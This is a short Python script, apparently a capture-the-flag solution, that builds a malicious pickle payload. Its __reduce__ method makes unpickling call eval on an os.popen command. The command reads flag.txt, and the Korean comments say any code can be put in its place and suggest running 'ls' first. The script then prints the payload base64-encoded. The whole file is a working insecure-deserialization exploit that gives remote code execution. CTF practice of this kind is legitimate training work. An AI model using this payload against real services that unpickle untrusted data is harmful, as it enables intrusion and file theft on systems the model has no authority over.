import pickle
import base64

class RCE:
    def __reduce__(self):
        import builtins
        # 여기 문자열 안에 원하는 파이썬 코드를 적으면 됨
        # code_str = "__import__('os').popen('ls').read()"
        # ls 명령어를 통해 현재 디렉토리의 파일 목록을 확인할 수 있음
        # 그리고 flag 파일이 있는지 확인하고 cat flag.txt를 통해 플래그를 읽으면 됨
        code_str = "__import__('os').popen('cat flag.txt').read()"
        return (builtins.eval, (code_str,))

payload = pickle.dumps(RCE())
payload_b64 = base64.b64encode(payload).decode()
print(payload_b64)
